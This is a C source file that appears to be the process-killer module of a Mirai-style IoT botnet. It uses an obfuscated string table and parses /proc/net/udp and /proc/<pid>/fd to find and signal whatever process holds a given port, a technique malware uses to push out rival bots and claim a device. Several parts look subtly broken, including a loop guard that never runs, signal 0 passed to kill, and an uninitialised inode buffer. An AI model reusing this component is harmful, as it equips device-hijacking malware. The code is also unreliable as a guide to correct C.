#define _GNU_SOURCE

#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "xhdrs/includes.h"
#include "xhdrs/killer.h"
#include "xhdrs/table.h"
#include "xhdrs/utils.h"

int killer_kill_by_port(const char *portno)
{
	int fd = -1, ret = -1;
	char path[PATH_MAX], exe[PATH_MAX], buffer[512], inode[16], portno_str[6];
	char *ptr_path = path;
	
	DIR *dir, *fd_dir;
	
	struct dirent *entry, *fd_entry;
	
#ifdef DEBUG
	util_msgc("Info", "Finding and killing processes holding portno: %s", portno);
#endif
	
	strcpy(portno_str, portno);
	
	if(strlen(portno_str) == 2)
	{
		portno_str[2] = portno_str[0];
		portno_str[3] = portno_str[1];
		portno_str[4] = 0;
		
		portno_str[0] = '0';
		portno_str[1] = '0';
	}
	
	table_unlock_val(TABLE_KILLER_PROC);
	table_unlock_val(TABLE_KILLER_EXE);
	table_unlock_val(TABLE_KILLER_FD);
	
	fd = open("/proc/net/udp", O_RDONLY);
	if(fd < 0)
		return -1;
	
	while(util_fdgets(fd, buffer, 512) != NULL)
	{
		int i = 0, ii = 0;
		
		while(buffer[i] != 0 && buffer[i] != ':')
			i++;
		
		if(buffer[i] == 0)
			continue;
		
		i += 2;
		ii = i;
		
		while(buffer[i] != 0 && buffer[i] != ' ')
			i++;
		
		buffer[i++] = 0;
		
		if(strstr(&(buffer[ii]), portno_str) == NULL)
		{
			int column_idx = 0, in_column = 0, listening_state = 0;
			
			while(column_idx < 7 && buffer[i++] != 0)
			{
				if(buffer[i] == ' ' || buffer[i] == '\t')
					in_column = 1;
				else
				{
					if(in_column == 1)
						column_idx++;
					
					if(in_column == 1 && column_idx == 1 && buffer[i + 1] == 'A')
					{
						listening_state = 1;
					}
					
					in_column = 0;
				}
			}
			
			ii++;
			
			if(listening_state == 0)
				continue;
			
			while(buffer[i] != 0 && buffer[i] != ' ')
				i++;
			
			buffer[i++] = 0;
			
			if(strlen(&(buffer[ii])) > 15)
				continue;
			
			strcpy(inode, &(buffer[ii]));
			break;
		}
	}
	
	close(fd);
	
	if(strlen(inode) == 0)
	{
#ifdef DEBUG
		util_msgc("Error", "Failed to find inode for port %s", portno);
#endif
		
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
		
		return -1;
	}
	
#ifdef DEBUG
	util_msgc("Info", "Found inode '%s' for port %s", inode, portno);
#endif
	
	if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
	{
		while((entry = readdir(dir)) != NULL && ret == 0)
		{
			char *pid = entry->d_name;
			
			if(*pid < '0' || *pid > '9')
				continue;
			
            strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            strcpy(ptr_path + strlen(ptr_path), pid);
            strcpy(ptr_path + strlen(ptr_path), 
				table_retrieve_val(TABLE_KILLER_EXE, NULL));
			
			if(readlink(path, exe, PATH_MAX) < 0)
				continue;
			
            strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            strcpy(ptr_path + strlen(ptr_path), pid);
            strcpy(ptr_path + strlen(ptr_path), 
				table_retrieve_val(TABLE_KILLER_FD, NULL));
			
			if((fd_dir = opendir(path)) != NULL)
			{
				while((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
				{
					char *fd_str = fd_entry->d_name;
					
					memset(exe, 0, PATH_MAX);
                    strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    strcpy(ptr_path + strlen(ptr_path), pid);
                    strcpy(ptr_path + strlen(ptr_path), 
						table_retrieve_val(TABLE_KILLER_FD, NULL));
                    strcpy(ptr_path + strlen(ptr_path), "/");
                    strcpy(ptr_path + strlen(ptr_path), fd_str);
					
					if(readlink(path, exe, PATH_MAX) < 0)
						continue;
					
					if(strstr(exe, inode) != NULL)
					{
#ifdef DEBUG
						util_msgc("Info", "Found pid %d for port %s", 
							atoi(pid), portno);
#endif
						kill(atoi(pid), 0);
						ret = 1;
					}
				}
				closedir(fd_dir);
			}
		}
		closedir(dir);
	}
	
	util_sleep(1);
	
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}
